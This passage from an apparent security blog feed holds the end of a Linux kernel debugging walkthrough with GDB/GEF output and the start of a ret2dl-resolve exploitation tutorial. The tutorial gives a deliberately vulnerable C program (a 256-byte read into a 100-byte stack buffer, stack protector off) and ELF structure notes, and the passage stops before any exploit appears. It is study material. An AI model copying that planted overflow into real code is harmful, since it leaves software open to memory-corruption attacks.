at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">' to start, `gef config'</span> to configure</span><br><span class="line">79 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 1 <span class="built_in">command</span> could not be loaded, run `gef missing` to know why.</span><br><span class="line">Reading symbols from /home/assassinq/linux-4.4.1/vmlinux...done.</span><br><span class="line">warning: File <span class="string">"/home/assassinq/linux-4.4.1/scripts/gdb/vmlinux-gdb.py"</span> auto-loading has been declined by your `auto-load safe-path<span class="string">' set to "$debugdir:$datadir/auto-load".</span></span><br><span class="line"><span class="string">To enable execution of this file add</span></span><br><span class="line"><span class="string">add-auto-load-safe-path /home/assassinq/linux-4.4.1/scripts/gdb/vmlinux-gdb.py</span></span><br><span class="line"><span class="string">line to your configuration file "/home/assassinq/.gdbinit".</span></span><br><span class="line"><span class="string">To completely disable this security protection add</span></span><br><span class="line"><span class="string">set auto-load safe-path /</span></span><br><span class="line"><span class="string">line to your configuration file "/home/assassinq/.gdbinit".</span></span><br><span class="line"><span class="string">For more information about this security protection see the</span></span><br><span class="line"><span class="string">"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:</span></span><br><span class="line"><span class="string">info "(gdb)Auto-loading safe path"</span></span><br><span class="line"><span class="string">Remote debugging using localhost:1234</span></span><br><span class="line"><span class="string">native_safe_halt () at ./arch/x86/include/asm/irqflags.h:50</span></span><br><span class="line"><span class="string">50&#125;</span></span><br><span class="line"><span class="string">[ Legend: Modified register | Code | Heap | Stack | String ]</span></span><br><span class="line"><span class="string">───────────────────────────────────────────────────────────────── registers ────</span></span><br><span class="line"><span class="string">$rax   : 0x0000000000000000  →  0x0000000000000000</span></span><br><span class="line"><span class="string">$rbx   : 0xffffffff81d585c0  →  0x0000000000000001  →  0x0000000000000001</span></span><br><span class="line"><span class="string">$rcx   : 0x0000000000000000  →  0x0000000000000000</span></span><br><span class="line"><span class="string">$rdx   : 0x0000000000000000  →  0x0000000000000000</span></span><br><span class="line"><span class="string">$rsp   : 0xffffffff81bf7e98  →  &lt;init_thread_union+16024&gt; mov eax, 0xff81bf7e</span></span><br><span class="line"><span class="string">$rbp   : 0xffffffff81bf7e98  →  &lt;init_thread_union+16024&gt; mov eax, 0xff81bf7e</span></span><br><span class="line"><span class="string">$rsi   : 0x0000000000000000  →  0x0000000000000000</span></span><br><span class="line"><span class="string">$rdi   : 0x0000000000000000  →  0x0000000000000000</span></span><br><span class="line"><span class="string">$rip   : 0xffffffff810624f6  →  0x000000841f0fc35d  →  0x000000841f0fc35d</span></span><br><span class="line"><span class="string">$r8    : 0xffff88000760db60  →  0x0000000000000000  →  0x0000000000000000</span></span><br><span class="line"><span class="string">$r9    : 0x0000000000000000  →  0x0000000000000000</span></span><br><span class="line"><span class="string">$r10   : 0x0000000000000333  →  0x0000000000000333</span></span><br><span class="line"><span class="string">$r11   : 0xffff880006d8bde0  →  0x0000000000000400  →  0x0000000000000400</span></span><br><span class="line"><span class="string">$r12   : 0x0000000000000000  →  0x0000000000000000</span></span><br><span class="line"><span class="string">$r13   : 0x0000000000000000  →  0x0000000000000000</span></span><br><span class="line"><span class="string">$r14   : 0x0000000000000000  →  0x0000000000000000</span></span><br><span class="line"><span class="string">$r15   : 0xffffffff81bf4000  →  &lt;init_thread_union+0&gt; add BYTE PTR [rbp-0x40], dl</span></span><br><span class="line"><span class="string">$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="string">$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000</span></span><br><span class="line"><span class="string">───────────────────────────────────────────────────────────────────── stack ────</span></span><br><span class="line"><span class="string">[!] Unmapped address</span></span><br><span class="line"><span class="string">─────────────────────────────────────────────────────────────── code:x86:64 ────</span></span><br><span class="line"><span class="string">   0xffffffff810624f1 &lt;native_safe_halt+1&gt; mov    rbp, rsp</span></span><br><span class="line"><span class="string">   0xffffffff810624f4 &lt;native_safe_halt+4&gt; sti</span></span><br><span class="line"><span class="string">   0xffffffff810624f5 &lt;native_safe_halt+5&gt; hlt</span></span><br><span class="line"><span class="string">   0xffffffff810624f6 &lt;native_safe_halt+6&gt; pop    rbp</span></span><br><span class="line"><span class="string">   0xffffffff810624f7 &lt;native_safe_halt+7&gt; ret</span></span><br><span class="line"><span class="string">   0xffffffff810624f8                  nop    DWORD PTR [rax+rax*1+0x0]</span></span><br><span class="line"><span class="string">   0xffffffff81062500 &lt;native_halt+0&gt;  push   rbp</span></span><br><span class="line"><span class="string">   0xffffffff81062501 &lt;native_halt+1&gt;  mov    rbp, rsp</span></span><br><span class="line"><span class="string">   0xffffffff81062504 &lt;native_halt+4&gt;  hlt</span></span><br><span class="line"><span class="string">────────────────────────────────────────── source:./arch/x86/incl[...].h+50 ────</span></span><br><span class="line"><span class="string">     45 &#125;</span></span><br><span class="line"><span class="string">     46</span></span><br><span class="line"><span class="string">     47 static inline void native_safe_halt(void)</span></span><br><span class="line"><span class="string">     48 &#123;</span></span><br><span class="line"><span class="string">     49 asm volatile("sti; hlt": : :"memory");</span></span><br><span class="line"><span class="string"> →   50 &#125;</span></span><br><span class="line"><span class="string">     51</span></span><br><span class="line"><span class="string">     52 static inline void native_halt(void)</span></span><br><span class="line"><span class="string">     53 &#123;</span></span><br><span class="line"><span class="string">     54 asm volatile("hlt": : :"memory");</span></span><br><span class="line"><span class="string">     55 &#125;</span></span><br><span class="line"><span class="string">─────────────────────────────────────────────────────────────────── threads ────</span></span><br><span class="line"><span class="string">[#0] Id 1, Name: "", stopped, reason: SIGTRAP</span></span><br><span class="line"><span class="string">───────────────────────────────────────────────────────────────────── trace ────</span></span><br><span class="line"><span class="string">[#0] 0xffffffff810624f6 → native_safe_halt()</span></span><br><span class="line"><span class="string">[#1] 0xffffffff81020cee → arch_safe_halt()</span></span><br><span class="line"><span class="string">[#2] 0xffffffff81020cee → default_idle()</span></span><br><span class="line"><span class="string">[#3] 0xffffffff8102147f → arch_cpu_idle()</span></span><br><span class="line"><span class="string">[#4] 0xffffffff810c06fa → default_idle_call()</span></span><br><span class="line"><span class="string">[#5] 0xffffffff810c0a37 → cpuidle_idle_call()</span></span><br><span class="line"><span class="string">[#6] 0xffffffff810c0a37 → cpu_idle_loop()</span></span><br><span class="line"><span class="string">[#7] 0xffffffff810c0a37 → cpu_startup_entry(state=&lt;optimized out&gt;)</span></span><br><span class="line"><span class="string">[#8] 0xffffffff8181accc → rest_init()</span></span><br><span class="line"><span class="string">[#9] 0xffffffff81d7f023 → start_kernel()</span></span><br><span class="line"><span class="string">────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="string">gef➤  b cmdline_proc_show</span></span><br><span class="line"><span class="string">Breakpoint 1 at 0xffffffff81276000: file fs/proc/cmdline.c, line 7.</span></span><br><span class="line"><span class="string">gef➤  c</span></span><br><span class="line"><span class="string">Continuing.</span></span><br></pre></td></tr></table></figure><p>在终端输入<code>cat /proc/cmdline</code>后会被断点断下来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0 gid=0</span><br><span class="line">/ <span class="comment"># whoami</span></span><br><span class="line">whoami: unknown uid 0</span><br><span class="line">/ <span class="comment"># pwd</span></span><br><span class="line">/</span><br><span class="line">/ <span class="comment"># cat /proc/cmdline</span></span><br></pre></td></tr></table></figure><p>可以跟着源码调试了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Breakpoint 1, cmdline_proc_show (m=0xffff880005f7c180, v=0x1 &lt;irq_stack_union+1&gt;) at fs/proc/cmdline.c:7</span><br><span class="line">7&#123;</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0xffff880000047ee0  →   push rax</span><br><span class="line">$rbx   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rcx   : 0x0000000000003014  →  0x0000000000003014</span><br><span class="line">$rdx   : 0x0000000000003013  →  0x0000000000003013</span><br><span class="line">$rsp   : 0xffff880005fc3868  →   mov esp, 0xff812245</span><br><span class="line">$rbp   : 0xffff880005fc38d0  →   lock cmp ah, bh</span><br><span class="line">$rsi   : 0x0000000000000001  →  0x0000000000000001</span><br><span class="line">$rdi   : 0xffff880005f7c180  →   add BYTE PTR [rax], al</span><br><span class="line">$rip   : 0xffffffff81276000  →  &lt;cmdline_proc_show+0&gt; nop DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">$r8    : 0xffff880007619bc0  →   add BYTE PTR [rax-0xc], al</span><br><span class="line">$r9    : 0xffff880005f40000  →   add BYTE PTR [rax-0xc], al</span><br><span class="line">$r10   : 0x0000000000000001  →  0x0000000000000001</span><br><span class="line">$r11   : 0xffff880005fc4000  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r12   : 0xffff880005fc3a88  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r13   : 0xffff880005f7d000  →  0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$r14   : 0xffff880005f7c180  →   add BYTE PTR [rax], al</span><br><span class="line">$r15   : 0x0000000000000001  →  0x0000000000000001</span><br><span class="line">$eflags: [CARRY parity adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0063 $gs: 0x0000</span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">[!] Unmapped address</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0xffffffff81275ff7 &lt;cmdline_proc_open+23&gt; repnz  cli</span><br><span class="line">   0xffffffff81275ff9 &lt;cmdline_proc_open+25&gt; call   FWORD PTR [rbp-0x3d]</span><br><span class="line">   0xffffffff81275ffc                  nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0xffffffff81276000 &lt;cmdline_proc_show+0&gt; nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0xffffffff81276005 &lt;cmdline_proc_show+5&gt; push   rbp</span><br><span class="line">   0xffffffff81276006 &lt;cmdline_proc_show+6&gt; mov    rdx, QWORD PTR [rip+0xcccffb]        # 0xffffffff81f43008 &lt;saved_command_line&gt;</span><br><span class="line">   0xffffffff8127600d &lt;cmdline_proc_show+13&gt; mov    rsi, 0xffffffff81b454d3</span><br><span class="line">   0xffffffff81276014 &lt;cmdline_proc_show+20&gt; mov    rbp, rsp</span><br><span class="line">   0xffffffff81276017 &lt;cmdline_proc_show+23&gt; call   0xffffffff81224970 &lt;seq_printf&gt;</span><br><span class="line">──────────────────────────────────────────────── source:fs/proc/cmdline.c+7 ────</span><br><span class="line">      2 #include &lt;linux/init.h&gt;</span><br><span class="line">      3 #include &lt;linux/proc_fs.h&gt;</span><br><span class="line">      4 #include &lt;linux/seq_file.h&gt;</span><br><span class="line">      5</span><br><span class="line">      6 static int cmdline_proc_show(struct seq_file *m, void *v)</span><br><span class="line"> →    7 &#123;</span><br><span class="line">      8 seq_printf(m, &quot;%s\n&quot;, saved_command_line);</span><br><span class="line">      9 return 0;</span><br><span class="line">     10 &#125;</span><br><span class="line">     11</span><br><span class="line">     12 static int cmdline_proc_open(struct inode *inode, struct file *file)</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;&quot;, stopped, reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0xffffffff81276000 → cmdline_proc_show(m=0xffff880005f7c180, v=0x1 &lt;irq_stack_union+1&gt;)</span><br><span class="line">[#1] 0xffffffff812245bc → seq_read(file=0xffff880005f7d000, buf=&lt;optimized out&gt;, size=&lt;optimized out&gt;, ppos=0xffff880005fc3a88)</span><br><span class="line">[#2] 0xffffffff8126d4e2 → proc_reg_read(file=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, count=&lt;optimized out&gt;, ppos=&lt;optimized out&gt;)</span><br><span class="line">[#3] 0xffffffff811fff55 → do_loop_readv_writev(filp=&lt;optimized out&gt;, iter=0xffff880005fc3958, ppos=0xffff880005fc3a88, fn=0xffffffff8126d4a0 &lt;proc_reg_read&gt;)</span><br><span class="line">[#4] 0xffffffff81200d52 → do_readv_writev(type=0x0, file=0xffff880005f7d000, uvector=&lt;optimized out&gt;, nr_segs=&lt;optimized out&gt;, pos=0xffff880005fc3a88)</span><br><span class="line">[#5] 0xffffffff81200da6 → vfs_readv(file=&lt;optimized out&gt;, vec=&lt;optimized out&gt;, vlen=&lt;optimized out&gt;, pos=&lt;optimized out&gt;)</span><br><span class="line">[#6] 0xffffffff8123283a → kernel_readv(offset=&lt;optimized out&gt;, vlen=&lt;optimized out&gt;, vec=&lt;optimized out&gt;, file=&lt;optimized out&gt;)</span><br><span class="line">[#7] 0xffffffff8123283a → default_file_splice_read(in=&lt;optimized out&gt;, ppos=&lt;optimized out&gt;, pipe=&lt;optimized out&gt;, len=0xff0000, flags=&lt;optimized out&gt;)</span><br><span class="line">[#8] 0xffffffff81231209 → do_splice_to(in=0xffff880005f7d000, ppos=0xffff880005fc3df0, pipe=0xffff880005f7c300, len=0x1000000, flags=0x0)</span><br><span class="line">[#9] 0xffffffff812312da → splice_direct_to_actor(in=&lt;optimized out&gt;, sd=0x1 &lt;irq_stack_union+1&gt;, actor=&lt;optimized out&gt;)</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://xz.aliyun.com/t/2306" target="_blank" rel="noopener">https://xz.aliyun.com/t/2306</a><br><a href="https://n132.github.io/2019/07/14/2019-07-14-kernel-Outset/" target="_blank" rel="noopener">https://n132.github.io/2019/07/14/2019-07-14-kernel-Outset/</a><br><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/4.1_linux_kernel_debug.md" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One/blob/master/doc/4.1_linux_kernel_debug.md</a><br><a href="http://blog.sina.com.cn/s/blog_3e4774e30102vwqy.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_3e4774e30102vwqy.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在分析一个 CVE 的时候涉及到对内核的调试，先提前研究一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux" scheme="https://qianfei11.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>A trip of ret2dl-resolve</title>
    <link href="https://qianfei11.github.io/2019/08/06/A-trip-of-ret2dl-resolve/"/>
    <id>https://qianfei11.github.io/2019/08/06/A-trip-of-ret2dl-resolve/</id>
    <published>2019-08-06T08:04:26.000Z</published>
    <updated>2019-08-26T05:55:20.464Z</updated>
    
    <content type="html"><![CDATA[<p>一步步了解<code>dl-resolve</code>的利用方法。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>通过利用<code>ret2dl-resolve</code>绕过 NX 和 ASLR 的限制。</p><p>例子如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">"Return to dl_runtime_resolve!\n"</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -o bof -m32 -fno-stack-protector bof.c</span></span><br></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><p>ELF 可执行文件由 ELF 头部，程序头部表和其对应的段，节头部表和其对应的节组成，源码在<a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener">elf.h</a>中实现</p><p>一个参与动态链接的可执行文件，它的程序头部表包含类型为<code>PT_DYNAMIC</code>的段，<code>PT_DYNAMIC</code>又包含<code>.dynamic</code>节，程序头的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword        d_tag;                        <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word d_val;                        <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;                        <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword        d_tag;                        <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;                <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;                        <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>执行<code>readelf -d ./bof</code>，其中<code>Tag</code>对应每一个节，比如<code>JMPREL</code>对应着<code>.rel.plt</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">λ readelf -d ./bof</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048358</span><br><span class="line"> 0x0000000d (FINI)                       0x8048634</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x8048278</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481d8</span><br><span class="line"> 0x0000000a (STRSZ)                      107 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   40 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048330</span><br><span class="line"> 0x00000011 (REL)                        0x8048318</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482f8</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482e4</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><p>节中包含目标文件的所有信息，节的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Section header.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word        sh_name;                <span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word        sh_type;                <span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word        sh_flags;                <span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr        sh_addr;                <span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off        sh_offset;                <span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word        sh_size;                <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word        sh_link;                <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word        sh_info;                <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word        sh_addralign;                <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word        sh_entsize;                <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        sh_name;                <span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf64_Word        sh_type;                <span class="comment">/* Section type */</span></span><br><span class="line">  Elf64_Xword        sh_flags;                <span class="comment">/* Section flags */</span></span><br><span class="line">  Elf64_Addr        sh_addr;                <span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf64_Off        sh_offset;                <span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf64_Xword        sh_size;                <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf64_Word        sh_link;                <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf64_Word        sh_info;                <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf64_Xword        sh_addralign;                <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf64_Xword        sh_entsize;                <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure><p>执行<code>readelf -S ./bof</code>，列出了该<code>ELF</code>的 31 个节区：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">λ readelf -S ./bof</span><br><span class="line">There are 31 section headers, starting at offset 0x18a4:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        080483f0 0003f0 000242 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048634 000634 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048648 000648 000008 00 